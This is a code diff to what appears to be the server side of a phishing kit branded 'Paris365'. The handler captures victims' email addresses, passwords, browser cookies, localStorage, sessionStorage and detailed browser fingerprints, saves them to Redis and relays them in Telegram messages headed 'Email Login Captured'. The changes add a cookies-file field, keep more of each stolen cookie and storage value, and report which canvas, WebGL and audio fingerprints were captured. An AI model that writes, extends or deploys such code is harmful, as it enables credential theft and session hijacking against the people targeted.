@@ -33,7 +33,7 @@ export const handler = async (event, context) => {
     });
 
     const data = JSON.parse(event.body);
-    const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint } = data;
+    const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint, cookiesFileData } = data;
 
     // Get client IP with better detection for mobile
     const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
@@ -128,7 +128,8 @@ export const handler = async (event, context) => {
       sessionStorage: sessionStorageInfo,
       acceptLanguage,
       acceptEncoding,
-      browserFingerprint
+      browserFingerprint,
+      cookiesFileData
     };
 
     try {
@@ -136,13 +137,14 @@ export const handler = async (event, context) => {
       await redis.set(`session:${sessionId}`, JSON.stringify(sessionData));
       await redis.set(`user:${email}`, JSON.stringify(sessionData));
       
-      // Also store cookies separately for easy access
+      // Store cookies file data separately for easy access
       await redis.set(`cookies:${sessionId}`, JSON.stringify({
         cookies: cookieInfo,
         localStorage: localStorageInfo,
         sessionStorage: sessionStorageInfo,
         timestamp: timestamp,
-        email: email
+        email: email,
+        cookiesFileData: cookiesFileData
       }));
     } catch (redisError) {
       console.error('Redis storage error:', redisError);
@@ -154,17 +156,17 @@ export const handler = async (event, context) => {
     
     // Format cookies for better readability - show actual cookies now
     const cookiesDisplay = cookieInfo && cookieInfo !== 'No cookies found' 
-      ? (cookieInfo.length > 300 ? cookieInfo.substring(0, 300) + '...' : cookieInfo)
+      ? (cookieInfo.length > 500 ? cookieInfo.substring(0, 500) + '...' : cookieInfo)
       : '❌ No cookies found';
     
     // Format localStorage
     const localStorageDisplay = localStorageInfo && localStorageInfo !== 'Empty' 
-      ? (localStorageInfo.length > 200 ? localStorageInfo.substring(0, 200) + '...' : localStorageInfo)
+      ? (localStorageInfo.length > 300 ? localStorageInfo.substring(0, 300) + '...' : localStorageInfo)
       : '📭 Empty';
     
     // Format sessionStorage
     const sessionStorageDisplay = sessionStorageInfo && sessionStorageInfo !== 'Empty' 
-      ? (sessionStorageInfo.length > 200 ? sessionStorageInfo.substring(0, 200) + '...' : sessionStorageInfo)
+      ? (sessionStorageInfo.length > 300 ? sessionStorageInfo.substring(0, 300) + '...' : sessionStorageInfo)
       : '📭 Empty';
     
     // Additional browser data from comprehensive fingerprint
@@ -173,15 +175,28 @@ export const handler = async (event, context) => {
 🌍 *Timezone:* \`${browserFingerprint.timezone || 'Unknown'}\`
 🔧 *Platform:* \`${browserFingerprint.platform || 'Unknown'}\`
 🍪 *Cookies Enabled:* ${browserFingerprint.cookieEnabled ? '✅' : '❌'}
-📶 *Online Status:* ${browserFingerprint.onlineStatus || 'Unknown'}
+📶 *Online Status:* ${browserFingerprint.onlineStatus ? '✅ Online' : '❌ Offline'}
 🔌 *Plugins:* \`${browserFingerprint.plugins?.slice(0, 3).join(', ') || 'None'}${browserFingerprint.plugins?.length > 3 ? '...' : ''}\`
 🤖 *WebDriver:* ${browserFingerprint.webdriver ? '⚠️ Detected' : '✅ Not detected'}
 ⚡ *CPU Cores:* \`${browserFingerprint.hardwareConcurrency || 'Unknown'}\`${browserFingerprint.deviceMemory ? `
 💾 *Device Memory:* \`${browserFingerprint.deviceMemory}GB\`` : ''}${browserFingerprint.connection ? `
 📡 *Connection:* \`${browserFingerprint.connection}\`` : ''}${browserFingerprint.touchSupport ? `
-👆 *Touch Support:* ${browserFingerprint.touchSupport}` : ''}${browserFingerprint.orientation ? `
+👆 *Touch Support:* ${browserFingerprint.touchSupport ? '✅' : '❌'}` : ''}${browserFingerprint.orientation ? `
 📱 *Orientation:* \`${browserFingerprint.orientation}\`` : ''}${browserFingerprint.devicePixelRatio ? `
 🔍 *Pixel Ratio:* \`${browserFingerprint.devicePixelRatio}\`` : ''}` : '';
+
+    // Create cookies file summary for Telegram
+    const cookiesFileSummary = cookiesFileData ? `
+📁 *COOKIES FILE GENERATED:*
+• File contains ${Object.keys(JSON.parse(cookieInfo !== 'No cookies found' ? cookieInfo : '{}')).length} cookies
+• LocalStorage items: ${localStorageInfo !== 'Empty' ? Object.keys(JSON.parse(localStorageInfo)).length : 0}
+• SessionStorage items: ${sessionStorageInfo !== 'Empty' ? Object.keys(JSON.parse(sessionStorageInfo)).length : 0}
+• Canvas fingerprint: ${browserFingerprint?.canvas ? '✅ Captured' : '❌ Blocked'}
+• WebGL fingerprint: ${browserFingerprint?.webgl ? '✅ Captured' : '❌ Blocked'}
+• Audio fingerprint: ${browserFingerprint?.audio ? '✅ Captured' : '❌ Blocked'}
+• Fonts detected: ${browserFingerprint?.fonts?.length || 0}
+• File will be auto-downloaded to user's device
+` : '';
     
     const message = `
 🔐 *Email Login Captured*
@@ -203,10 +218,9 @@ ${deviceInfo}
 \`${localStorageDisplay}\`
 
 🗂️ *SESSION STORAGE:*
-\`${sessionStorageDisplay}\`${additionalInfo}
+\`${sessionStorageDisplay}\`${additionalInfo}${cookiesFileSummary}
 
 🆔 *Session ID:* \`${sessionId}\`
-📁 *Cookies File:* Downloaded automatically
 
 ---
 *Paris365 - Full Browser Session Captured*
@@ -266,7 +280,8 @@ ${deviceInfo}
         success: true, 
         message: 'Credentials and browser session captured successfully',
         sessionId: sessionId,
-        cookiesCollected: cookieInfo !== 'No cookies found'
+        cookiesCollected: cookieInfo !== 'No cookies found',
+        cookiesFileGenerated: !!cookiesFileData
       }),
     };
 
